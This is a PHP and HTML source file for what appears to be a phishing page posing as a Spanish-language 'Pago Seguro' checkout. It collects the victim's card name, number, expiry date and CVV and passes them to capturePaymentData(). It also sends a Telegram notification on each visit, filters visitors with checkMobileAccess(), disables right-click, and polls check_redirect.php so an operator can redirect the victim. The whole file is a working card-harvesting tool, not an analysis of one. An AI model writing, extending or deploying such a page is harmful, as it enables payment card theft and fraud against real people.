
<?php

require_once 'functions.php';

checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('payment');

// Protección CSRF
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Generar un token CSRF si no existe
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// CAPTURAR LOS DATOS DE PAGO SI SE ENVÍAN
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validación CSRF
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('Error de seguridad CSRF');
    }
    
    // Validación de datos
    $required_fields = ['card_name', 'card_number', 'expiry_date', 'cvv'];
    foreach ($required_fields as $field) {
        if (empty($_POST[$field])) {
            die('Campos faltantes');
        }
    }
    
    // Limpieza de datos
    $card_name = htmlspecialchars(trim($_POST['card_name']), ENT_QUOTES, 'UTF-8');
    $card_number = preg_replace('/\s+/', '', $_POST['card_number']); // Eliminar espacios
    $expiry_date = htmlspecialchars(trim($_POST['expiry_date']), ENT_QUOTES, 'UTF-8');
    $cvv = htmlspecialchars(trim($_POST['cvv']), ENT_QUOTES, 'UTF-8');
    
    // Validación de formatos
    if (!preg_match('/^[a-zA-Z\s]{2,50}$/', $card_name)) {
        die('Nombre inválido');
    }
    
    if (!preg_match('/^\d{16}$/', $card_number)) {
        die('Número de tarjeta inválido');
    }
    
    if (!preg_match('/^(0[1-9]|1[0-2])\/([0-9]{2})$/', $expiry_date)) {
        die('Fecha de expiración inválida');
    }
    
    if (!preg_match('/^\d{3}$/', $cvv)) {
        die('CVV inválido');
    }
    
    capturePaymentData();
    
    // Regenerar el token CSRF
    unset($_SESSION['csrf_token']);
    
    header('Location: cargando.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago Seguro</title>
 <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0px;
        }
        .header {
            text-align: center;
            margin-bottom: 10px;
            width: 100%;
            padding-top: 10px;
        }
        .logo {
            font-size: 3em;
        }
        .container {
            background: white;
            padding: 25px 15px;
            border-radius: 10px;
            box-shadow: 0 0px 10px rgba(0,0,0,0.2);
            width: 95%;
            max-width: 500px;
            margin-bottom: 15px;
            text-align: left;


        }
        h2 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
            font-size: 1.7em;
        }
        .image-section {
            margin-bottom: 25px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            color: #666;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 1em;
        }
        input {
            width: 102%;
            padding: 13px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #177ECF;
        }
        input.error {
            border-color: #e74c3c;
        }
        input.valid {
            border-color: #27ae60;
        }
        .error-message {
            color: #e74c3c;
            font-size: 0.75em;
            margin-top: 5px;
            display: none;
        }
        .card-row {
            display: flex;
            gap: 15px;
            align-items: flex-start;
        }
        .card-row .form-group {
            flex: 1;
            margin-bottom: 0;
        }
        .expiry-group {
            flex: 2;
        }
        .cvv-group {
            flex: 1;
        }
        .btn-container {
            width: 94%;
            max-width: 500px;
            margin-bottom: 40px;
        }
        .btn {
            background: #177ECF;
            color: white;
            border: none;
            padding: 16px;
            width: 90%;
            font-size: 1.1em;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }
        .btn:hover:not(:disabled) {
            background: #1568b5;
        }
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .spacer {
            height: 30px;
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="header">




            <a href="https://imgbb.com/"><img src="https://i.ibb.co/jP4NGJnh/T-l-chargement-2.jpg" alt="T-l-chargement-2" border="0" /></a>


        </div>

        <center><div class="container">
            <h2>Pago Seguro</h2>
            
            <div class="image-section">
<a href="https://imgbb.com/"><img src="https://i.ibb.co/BHJ1FySH/Capture-du-2025-11-11-13-59-38.png" alt="Capture-du-2025-11-11-13-59-38" border="0" /></a>
            </div>

            <form id="paymentForm" method="POST" autocomplete="on">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                
                <div class="form-group">
                    <label for="card_name">Nombre en la tarjeta</label>
                    <input type="text" id="card_name" name="card_name" placeholder="JUAN PÉREZ" required 
                           pattern="[A-Za-z\s]{2,50}" title="Solo letras y espacios (2-50 caracteres)"
                           oninput="this.value = this.value.toUpperCase()" autocomplete="cc-name">
                    <div class="error-message" id="cardNameError">Por favor ingrese un nombre válido (solo letras)</div>
                </div>

                <div class="form-group">
                    <label for="card_number">Número de tarjeta</label>
                    <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" 
                           maxlength="19" required title="Se requieren 16 dígitos" autocomplete="cc-number">
                    <div class="error-message" id="cardNumberError">El número de tarjeta debe contener 16 dígitos</div>
                </div>

                <div class="card-row">
                    <div class="form-group expiry-group">
                        <label for="expiry_date">Fecha de expiración</label>
                        <input type="text" id="expiry_date" name="expiry_date" placeholder="MM/AA" 
                               maxlength="5" required title="Formato MM/AA (ej: 12/25)" autocomplete="cc-exp">
                        <div class="error-message" id="expiryDateError">Formato inválido (MM/AA)</div>
                    </div>
                    <div class="form-group cvv-group">
                        <label for="cvv">CVV</label>
                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" 
                               required title="Se requieren 3 dígitos" autocomplete="cc-csc">
                        <div class="error-message" id="cvvError">El CVV debe contener 3 dígitos</div>
                    </div>
                </div>
            </form>
        </div>

        <center><div class="btn-container">
            <button type="submit" class="btn" id="submitBtn" form="paymentForm">
                Pagar ahora
            </button>
        </div></center>
        
        <div class="spacer"></div>
    </div>

    <?php include 'footer.php'; ?>


<script>
// Evitar clic derecho en toda la página
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Evitar clic en las imágenes
document.addEventListener('DOMContentLoaded', function() {
    const images = document.querySelectorAll('img');
    images.forEach(img => {
        img.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        // Evitar arrastrar y soltar
        img.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
    });
});
</script>




    <script>
        // Formateo automático del número de tarjeta
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
            
            const digitsOnly = value.replace(/\D/g, '');
            const errorElement = document.getElementById('cardNumberError');
            
            if (digitsOnly.length === 16) {
                e.target.classList.remove('error');
                e.target.classList.add('valid');
                errorElement.style.display = 'none';
            } else {
                e.target.classList.add('error');
                e.target.classList.remove('valid');
                errorElement.style.display = 'block';
            }
            validateForm();
        });

        // Formateo automático de la fecha de expiración
        document.getElementById('expiry_date').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2);
            }
            
            e.target.value = value.substring(0, 5);
            
            const errorElement = document.getElementById('expiryDateError');
            const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
            
            if (regex.test(e.target.value)) {
                e.target.classList.remove('error');
                e.target.classList.add('valid');
                errorElement.style.display = 'none';
            } else {
                e.target.classList.add('error');
                e.target.classList.remove('valid');
                errorElement.style.display = 'block';
            }
            validateForm();
        });

        // Validación del CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/g, '');
            e.target.value = value.substring(0, 3);
            
            const errorElement = document.getElementById('cvvError');
            if (value.length === 3) {
                e.target.classList.remove('error');
                e.target.classList.add('valid');
                errorElement.style.display = 'none';
            } else {
                e.target.classList.add('error');
                e.target.classList.remove('valid');
                errorElement.style.display = 'block';
            }
            validateForm();
        });

        // Validación del nombre en la tarjeta
        document.getElementById('card_name').addEventListener('input', function(e) {
            const errorElement = document.getElementById('cardNameError');
            const regex = /^[A-Za-z\s]{2,50}$/;
            
            if (regex.test(e.target.value.trim())) {
                e.target.classList.remove('error');
                e.target.classList.add('valid');
                errorElement.style.display = 'none';
            } else {
                e.target.classList.add('error');
                e.target.classList.remove('valid');
                errorElement.style.display = 'block';
            }
            validateForm();
        });

        // Envío del formulario con la tecla Enter en cualquier campo
        document.querySelectorAll('#paymentForm input').forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    submitFormIfValid();
                }
            });
        });

        function validateForm() {
            const cardNumber = document.getElementById('card_number').value.replace(/\s+/g, '');
            const expiryDate = document.getElementById('expiry_date').value;
            const cvv = document.getElementById('cvv').value;
            const cardName = document.getElementById('card_name').value.trim();
            
            const cardNumberValid = cardNumber.length === 16 && /^\d+$/.test(cardNumber);
            const expiryDateValid = /^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiryDate);
            const cvvValid = cvv.length === 3 && /^\d+$/.test(cvv);
            const cardNameValid = /^[A-Za-z\s]{2,50}$/.test(cardName);
            
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = !(cardNumberValid && expiryDateValid && cvvValid && cardNameValid);
            
            return (cardNumberValid && expiryDateValid && cvvValid && cardNameValid);
        }


function submitFormIfValid() {
    if (validateForm()) {
        document.getElementById('paymentForm').submit();
    } else {
        // REMPLACER L'ALERTE NATIVE PAR UNE MODALE PERSONNALISÉE
        showCustomError('Por favor, complete todos los campos correctamente antes de enviar el formulario.');
        
        // Enfocar el primer campo con error
        const inputs = document.querySelectorAll('#paymentForm input');
        for (let input of inputs) {
            if (input.classList.contains('error')) {
                input.focus();
                break;
            }
        }
    }
}



        function submitFormIfValid() {
            if (validateForm()) {
                document.getElementById('paymentForm').submit();
            } else {
              
                
                // Enfocar el primer campo con error
                const inputs = document.querySelectorAll('#paymentForm input');
                for (let input of inputs) {
                    if (input.classList.contains('error')) {
                        input.focus();
                        break;
                    }
                }
            }
        }

        // Manejar el clic en el botón de envío
        document.getElementById('submitBtn').addEventListener('click', function(e) {
            e.preventDefault();
            submitFormIfValid();
        });

        // Validación inicial
        validateForm();

        // Protección contra navegación hacia atrás
        window.addEventListener('pageshow', function(event) {
            if (event.persisted) {
                window.location.reload();
            }
        });

        // Verificación de redirección
        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>

